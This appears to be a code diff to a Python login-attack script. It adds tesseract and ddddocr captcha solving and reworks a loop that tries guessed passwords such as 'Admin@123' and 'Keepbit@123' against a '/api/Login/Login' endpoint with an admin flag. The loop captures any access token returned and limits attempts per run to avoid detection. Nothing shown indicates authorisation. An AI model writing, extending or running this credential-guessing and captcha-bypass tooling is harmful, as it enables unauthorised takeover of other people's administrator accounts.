@@ -111,14 +111,50 @@ def pause():
     time.sleep(random.uniform(8, 15))
 
 
+_TESS_WHITELIST = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
+
+
+def _tess_file(tfname, psm):
+    import re as _re, subprocess
+    out = subprocess.run(
+        ["tesseract", tfname, "stdout", "--psm", psm,
+         "-c", "tessedit_char_whitelist=" + _TESS_WHITELIST],
+        capture_output=True, timeout=30)
+    return _re.sub(r"\s+", "", out.stdout.decode("utf-8", "ignore").strip())
+
+
+def _tess_on_image(name, im, answers):
+    import tempfile, os
+    tf = tempfile.NamedTemporaryFile(suffix=".png", delete=False)
+    im.save(tf.name)
+    tfname = tf.name
+    tf.close()
+    try:
+        for psm in ("7", "8", "13"):
+            try:
+                t = _tess_file(tfname, psm)
+                if t:
+                    answers.append(("%s_psm%s" % (name, psm), t))
+            except Exception as e:
+                print("[!] tess %s psm%s err %s" % (name, psm, e), flush=True)
+    finally:
+        try:
+            os.unlink(tfname)
+        except Exception:
+            pass
+
+
 def ocr_answers(img_bytes):
-    """Candidate answers: ddddocr (raw+preproc) then tesseract (psm 7/8/13, upscaled)."""
+    """Candidate answers in priority order: ddddocr (raw+preproc) then tesseract
+    (PIL-preproc if available, else raw stdin). PIL-free tesseract fallback."""
     import re as _re
     answers = []
+    have_pil = False
     # --- ddddocr ---
     try:
         import ddddocr
         from PIL import Image, ImageOps
+        have_pil = True
         ocr = ddddocr.DdddOcr(show_ad=False)
         try:
             answers.append(("dd_raw", ocr.classification(img_bytes)))
@@ -133,38 +169,37 @@ def ocr_answers(img_bytes):
             print("[!] ocr preproc err %s" % e, flush=True)
     except Exception as e:
         print("[!] ddddocr missing: %s" % e, flush=True)
-    # --- tesseract fallback ---
+    # --- tesseract ---
     try:
-        import subprocess, tempfile, os
-        from PIL import Image, ImageOps
-        img = Image.open(io_bytes(img_bytes)).convert("L")
-        variants = []
-        variants.append(("tess_raw", img))
-        up = img.resize((img.width * 4, img.height * 4), Image.LANCZOS)
-        up = ImageOps.autocontrast(up)
-        variants.append(("tess_up", up))
-        variants.append(("tess_bw", up.point(lambda p: 255 if p > 140 else 0)))
-        for name, im in variants:
+        import subprocess
+        if have_pil:
+            from PIL import Image, ImageOps
+            img = Image.open(io_bytes(img_bytes)).convert("L")
+            _tess_on_image("tess_raw", img, answers)
+            up = img.resize((img.width * 4, img.height * 4), Image.LANCZOS)
+            up = ImageOps.autocontrast(up)
+            _tess_on_image("tess_up", up, answers)
+            _tess_on_image("tess_bw", up.point(lambda p: 255 if p > 140 else 0), answers)
+        else:
+            # PIL-free: raw PNG to temp file, tesseract CLI only
+            import tempfile, os
             tf = tempfile.NamedTemporaryFile(suffix=".png", delete=False)
-            im.save(tf.name)
+            tf.write(img_bytes)
             tfname = tf.name
             tf.close()
-            for psm in ("7", "8", "13"):
-                try:
-                    out = subprocess.run(
-                        ["tesseract", tfname, "stdout", "--psm", psm,
-                         "-c", "tessedit_char_whitelist="
-                         "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"],
-                        capture_output=True, timeout=30)
-                    t = _re.sub(r"\s+", "", out.stdout.decode("utf-8", "ignore").strip())
-                    if t:
-                        answers.append(("%s_psm%s" % (name, psm), t))
-                except Exception as e:
-                    print("[!] tess %s psm%s err %s" % (name, psm, e), flush=True)
             try:
-                os.unlink(tfname)
-            except Exception:
-                pass
+                for psm in ("7", "8", "13"):
+                    try:
+                        t = _tess_file(tfname, psm)
+                        if t:
+                            answers.append(("tess_rawpsm%s" % psm, t))
+                    except Exception as e:
+                        print("[!] tess psm%s err %s" % (psm, e), flush=True)
+            finally:
+                try:
+                    os.unlink(tfname)
+                except Exception:
+                    pass
     except Exception as e:
         print("[!] tesseract missing: %s" % e, flush=True)
     # dedupe preserving order
@@ -259,50 +294,48 @@ def main():
         if not pwds:
             pwds = ["Aa123456.", "666666", "123456", "k4806008",
                     "Admin@123", "Keepbit@123", "Qqlink@123"]
-        pwds = pwds[:3]
-        print("[*] FULL pwd candidates: %d" % len(pwds), flush=True)
+        pwds = pwds[:1]  # budget: <=5 req/run -> exactly ONE pwd per run
+        print("[*] FULL pwd candidates: %d (budget 5req/run)" % len(pwds), flush=True)
         for pi, pwd in enumerate(pwds):
-            cap_tries = 0
-            while cap_tries < 2:
-                cap_tries += 1
-                r3, img_b64, key = fetch_captcha(c)
-                print("FULL pwd#%d captcha#%d key=%s imglen=%d" % (
-                    pi, cap_tries, key, len(img_b64)), flush=True)
-                ans = ""
-                if img_b64:
-                    raw = base64.b64decode(img_b64)
-                    open("/tmp/cap%d.png" % (pi * 2 + cap_tries), "wb").write(raw)
-                    for name, a in ocr_answers(raw):
-                        print("FULL OCR#%d-%d %s -> %r" % (pi, cap_tries, name, a), flush=True)
-                        if a and re_full_code(a):
-                            ans = a
-                            break
+            r3, img_b64, key = fetch_captcha(c)
+            print("FULL pwd#%d captcha key=%s imglen=%d" % (pi, key, len(img_b64)), flush=True)
+            cands = []
+            if img_b64:
+                raw = base64.b64decode(img_b64)
+                open("/tmp/cap.png", "wb").write(raw)
+                for name, a in ocr_answers(raw):
+                    print("FULL OCR#%d %s -> %r" % (pi, name, a), flush=True)
+                    if a and re_full_code(a):
+                        cands.append(a)
+            if not cands:
+                cands = [""]
+            logged = 0
+            for ans in cands[:2]:  # at most 2 Login POSTs, same key
                 payload = {"appID": APPID, "pwd": base64.b64encode(pwd.encode()).decode(),
                            "email": em, "isAdmin": ISADMIN, "language": "en",
                            "verificationCode": ans, "verificationKey": key}
                 r4 = c.post_enc("/api/Login/Login", payload)
+                logged += 1
                 rc = r4.get("ErrCode")
                 rd = r4.get("ResData")
                 tok = ""
                 if isinstance(rd, dict):
                     tok = rd.get("AccessToken") or rd.get("accessToken") or ""
-                print("FULL LOGIN#%d pwd=%r cap=%r -> ErrCode=%s ErrMsg=%s token=%s" % (
-                    pi, pwd, ans, rc, r4.get("ErrMsg"), (tok[:60] + "...") if tok else ""), flush=True)
+                print("FULL LOGIN#%d pwd=%r cap=%r -> ErrCode=%s ErrMsg=%s Success=%s token=%s" % (
+                    pi, pwd, ans, rc, r4.get("ErrMsg"), r4.get("Success"),
+                    (tok[:60] + "...") if tok else ""), flush=True)
                 if tok:
                     print("TOKEN %s" % tok, flush=True)
                     break
                 if rc == "200" or (isinstance(rc, int) and rc == 200):
                     print("FULL LOGIN#%d Success=true" % pi, flush=True)
                     break
-                if "4042" in str(rc):
-                    # captcha wrong/expired - retry with fresh captcha once
-                    pause()
-                    continue
-                # password-level or other error: move to next pwd
-                break
-            if tok:
-                break
-            pause()
+                if "4042" not in str(rc):
+                    break  # captcha accepted; pwd-level/other error -> stop run
+                if logged >= 2:
+                    break
+                # 4042 wrong captcha: try next candidate on same key once
+            break
         print("[*] done", flush=True)
         return
 
